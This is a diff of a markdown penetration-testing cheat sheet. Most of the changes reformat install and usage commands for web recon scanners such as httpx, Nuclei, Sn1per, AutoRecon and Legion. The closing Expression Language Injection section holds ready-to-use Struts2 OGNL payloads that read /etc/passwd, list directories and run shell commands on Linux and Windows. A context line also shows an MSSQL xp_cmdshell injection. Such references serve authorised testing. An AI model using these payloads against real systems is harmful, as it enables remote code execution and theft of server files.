@@ -2,11 +2,9 @@
 
 ## **Automated tools**
 
-### httpx 
+### [httpx](https://github.com/projectdiscovery/httpx) 
 
 Web prober for fast discovery
-
-- [httpx](https://github.com/projectdiscovery/httpx)
 
 ```bash
 # Install httpx
@@ -17,12 +15,9 @@ httpx -l hosts.txt -silent -title -content-length -status-code
 subfinder -d <target> -silent | httpx -title -content-length -status-code -silent
 ```
 
-### Nuclei 
+### [Nuclei](https://github.com/projectdiscovery/nuclei)
 
 Full scanner based on templates
-
-- [Nuclei](https://github.com/projectdiscovery/nuclei)
-
 
 ```bash
 # Install Nuclei
@@ -30,11 +25,9 @@ GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei; nucle
 nuclei -l urls.txt -t 'cves/CVE-2020*'
 ```
 
-### Sn1per 
+### [Sn1per](https://github.com/1N3/Sn1per)
 
 Full scanner including many other tools
-
-- [Sn1per](https://github.com/1N3/Sn1per)
 
 ```bash
 # Install Sn1per
@@ -45,12 +38,9 @@ docker run -it xerosecurity/sn1per /bin/bash && sniper --help
 git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh && sniper --help
 ```
 
-### Autorecon 
-
+### [Autorecon](https://github.com/Tib3rius/AutoRecon)
 
 Full scanner
-
-- [AutoRecon](https://github.com/Tib3rius/AutoRecon)
 
 ```bash
 # Install AutoRecon
@@ -66,21 +56,16 @@ pipx install git+https://github.com/Tib3rius/AutoRecon.git && autorecon --help
 git clone https://github.com/Tib3rius/AutoRecon.git && cd AutoRecon && python3 -m pip install -r requirements.txt && cd src/autorecon/ && python3 autorecon.py --help
 ```
 
-### Legion 
+### [Legion](https://github.com/carlospolop/legion)
 
 Full scanner
-
-
-- [Legion](https://github.com/carlospolop/legion)
 
 ```bash
 # Manual install (as root)
 git clone https://github.com/carlospolop/legion.git /opt/legion && cd /opt/legion/git && ./install.sh && mv /usr/bin/legion /usr/bin/legion2 && ln -s /opt/legion/legion.py /usr/bin/legion && legion
 ```
 
-### Kali Linux pre-installed
-
-nikto
+### Kali pre-installed
 
 ```bash
 nikto -C all -output nikto.html -host <target> 
@@ -115,7 +100,6 @@ get js script
 ```bash
 go get github.com/tomnomnom/waybackurls
 waybackurls <target> | grep "\.js" | uniq | sort
-
 ```
 
 ---
@@ -334,28 +318,25 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--;EXEC xp_cmdshell 'w
 
 ### ELI
 
- Expression Language Injection
+Expression Language Injection
 
 ```bash
-#J2EEScan detection vector
+# J2EEScan detection vector
 https://www.example.url/?vulnerableParameter=PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.print(new java.lang.Integer(829+9)),#kzxs.close(),1?#xx:#request.toString}-POST&INJPARAM=HOOK_VAL
 
-#Blind detection vector
+# Blind detection vector
 https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@java.lang.Thread@sleep(10000),1?#xx:#request.toString}
 
-
-#*RFI
+# RFI
 https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=new java.io.FileInputStream(#wwww),#qqqq=new java.lang.Long(#wwww.length()),#tttt=new byte[#qqqq.intValue()],#llll=#pppp.read(#tttt),#pppp.close(),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(new java.lang.String(#tttt)),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=/etc/passwd
 
-
-#DIR LIST
+# DIR LIST
 https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=#wwww.listFiles(),#qqqq=@java.util.Arrays@toString(#pppp),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#qqqq),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=..
 
-
-#RCE LINUX
+# RCE LINUX
 https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=@java.lang.Runtime@getRuntime(),#ssss=new java.lang.String[3],#ssss[0]="/bin/sh",#ssss[1]="-c",#ssss[2]=#parameters.INJPARAM[0],#wwww.exec(#ssss),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=touch /tmp/InjectedFile.txt
 
-#RCE WINDOWS
+# RCE WINDOWS
 https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
 ```
 
